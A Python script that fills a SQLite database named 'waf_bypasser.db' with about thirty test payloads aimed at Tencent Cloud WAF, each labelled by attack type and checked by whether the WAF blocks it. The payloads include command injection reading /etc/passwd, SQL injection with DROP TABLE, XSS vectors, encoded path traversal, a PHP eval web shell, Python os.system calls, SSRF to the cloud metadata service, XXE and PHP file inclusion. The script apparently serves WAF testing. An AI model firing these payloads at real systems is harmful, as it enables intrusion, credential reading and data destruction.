#!/usr/bin/env python3
"""为腾讯云WAF创建专用测试payload"""

import sqlite3
import uuid
from datetime import datetime
from pathlib import Path

# 腾讯云WAF专用payload（放在URL路径中）
TENCENT_WAF_PAYLOADS = [
    # 命令注入
    ("腾讯WAF · 命令注入 · 基础分号", "命令注入", ";cat /etc/passwd"),
    ("腾讯WAF · 命令注入 · 管道符", "命令注入", "|cat /etc/passwd"),
    ("腾讯WAF · 命令注入 · 反引号", "命令注入", "`cat /etc/passwd`"),
    ("腾讯WAF · 命令注入 · 命令替换", "命令注入", "$(cat /etc/passwd)"),
    ("腾讯WAF · 命令注入 · 换行符", "命令注入", "%0acat /etc/passwd"),
    ("腾讯WAF · 命令注入 · AND逻辑", "命令注入", "&&cat /etc/passwd"),
    ("腾讯WAF · 命令注入 · IFS变量", "命令注入", ";cat${IFS}/etc/passwd"),

    # SQL注入
    ("腾讯WAF · SQL注入 · UNION查询", "SQL注入", "' UNION SELECT 1,2,3--"),
    ("腾讯WAF · SQL注入 · 布尔盲注", "SQL注入", "' OR '1'='1"),
    ("腾讯WAF · SQL注入 · 时间盲注", "SQL注入", "'; WAITFOR DELAY '00:00:05'--"),
    ("腾讯WAF · SQL注入 · 堆叠查询", "SQL注入", "'; DROP TABLE users--"),
    ("腾讯WAF · SQL注入 · 注释绕过", "SQL注入", "'/**/OR/**/1=1--"),

    # XSS
    ("腾讯WAF · XSS · Script标签", "XSS", "<script>alert(1)</script>"),
    ("腾讯WAF · XSS · IMG标签", "XSS", "<img src=x onerror=alert(1)>"),
    ("腾讯WAF · XSS · SVG标签", "XSS", "<svg onload=alert(1)>"),
    ("腾讯WAF · XSS · 事件处理", "XSS", "<body onload=alert(1)>"),
    ("腾讯WAF · XSS · JavaScript协议", "XSS", "<a href=javascript:alert(1)>"),
    ("腾讯WAF · XSS · Data URI", "XSS", "<iframe src=data:text/html,<script>alert(1)</script>>"),

    # 路径遍历
    ("腾讯WAF · 路径遍历 · 基础", "路径遍历", "../../../etc/passwd"),
    ("腾讯WAF · 路径遍历 · URL编码", "路径遍历", "..%2F..%2F..%2Fetc%2Fpasswd"),
    ("腾讯WAF · 路径遍历 · 双重编码", "路径遍历", "..%252F..%252F..%252Fetc%252Fpasswd"),

    # 代码执行
    ("腾讯WAF · 代码执行 · PHP eval", "代码执行", "<?php eval($_GET['c']); ?>"),
    ("腾讯WAF · 代码执行 · Python exec", "代码执行", "__import__('os').system('cat /etc/passwd')"),
    ("腾讯WAF · 代码执行 · SSTI", "代码执行", "{{7*7}}"),

    # SSRF
    ("腾讯WAF · SSRF · 内网IP", "SSRF", "http://127.0.0.1:22"),
    ("腾讯WAF · SSRF · 元数据服务", "SSRF", "http://169.254.169.254/latest/meta-data/"),

    # XXE
    ("腾讯WAF · XXE · 外部实体", "XXE", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),

    # 文件包含
    ("腾讯WAF · 文件包含 · PHP", "文件包含", "/index.php?file=../../../../etc/passwd"),
    ("腾讯WAF · 文件包含 · 伪协议", "文件包含", "/index.php?file=php://filter/read=convert.base64-encode/resource=index.php"),
]

def create_tencent_waf_payloads(db_path: str):
    """创建腾讯云WAF专用payload"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    timestamp = datetime.now().isoformat()
    created_count = 0

    for name, category, content in TENCENT_WAF_PAYLOADS:
        # 检查是否已存在
        cursor.execute(
            "SELECT id FROM payloads WHERE name = ? AND is_deleted = 0",
            (name,)
        )
        if cursor.fetchone():
            print(f"[跳过] 已存在: {name}")
            continue

        payload_id = str(uuid.uuid4())
        cursor.execute('''
            INSERT INTO payloads (
                id, name, vulnerability, category, delivery, target, difficulty,
                content, usage_method, success_indicators,
                is_pool_snapshot, is_deleted, created_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            payload_id,
            name,
            'tencent-waf',  # 关键：漏洞类型必须是 tencent-waf
            category,
            'URL路径',  # 腾讯云WAF测试通过URL路径投递
            '腾讯云WAF',
            '自定义',
            content,
            '直接发送到腾讯云WAF测试，payload会附加在URL路径中',
            '观察WAF是否拦截（403/405等）或放行（200/404等）',
            0,
            0,
            timestamp
        ))

        print(f"[创建] {name}")
        created_count += 1

    conn.commit()
    print(f"\n完成！创建了 {created_count} 个腾讯云WAF专用payload")
    conn.close()

if __name__ == "__main__":
    repo_root = Path(__file__).parent.parent
    db_path = repo_root / "data" / "waf_bypasser.db"

    if not db_path.exists():
        print(f"错误: 数据库文件不存在: {db_path}")
        exit(1)

    create_tencent_waf_payloads(str(db_path))
